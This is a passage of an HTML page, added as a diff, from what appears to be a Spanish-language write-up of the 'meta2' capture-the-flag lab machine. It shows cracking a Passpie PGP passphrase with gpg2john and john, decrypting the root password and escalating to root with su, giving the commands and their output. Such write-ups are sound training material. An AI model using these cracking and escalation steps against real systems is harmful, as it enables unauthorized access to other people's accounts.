+                <h3>Crackeando la Passphrase PGP</h3>
+                <p>Para descifrar estas contraseñas, necesito crackear la passphrase de la clave PGP. Transfiero el archivo <code>.keys</code> a mi máquina atacante y uso <code>gpg2john</code> para extraer un hash crackeable:</p>
+
+                <pre><code class="language-bash">gpg2john .keys</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">File .keys
+Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::.keys</code></pre>
+
+                <p>Guardo este hash en un archivo y lo crackeo con john:</p>
+                <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt gpghash.txt</code></pre>
+
+                <p>La passphrase se crackea exitosamente: <code>blink182</code></p>
+
+                <h3>Extrayendo la Contraseña de Root</h3>
+                <p>Ahora con la passphrase PGP, puedo descifrar la contraseña de root usando el comando <code>copy</code> de passpie:</p>
+                <pre><code class="language-bash">jnelson@meta2:~/.passpie$ passpie copy --to=stdout ssh --passphrase=blink182
+p7qfAZt4_A1xo_0x</code></pre>
+
+                <h2>Acceso Root</h2>
+                <p>Usando la contraseña de root extraída, escalo privilegios:</p>
+                <pre><code class="language-bash">jnelson@meta2:~/.passpie$ su
+Password: 
+root@meta2:/home/jnelson/.passpie#</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root de <code>/root/root.txt</code>, completando exitosamente la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
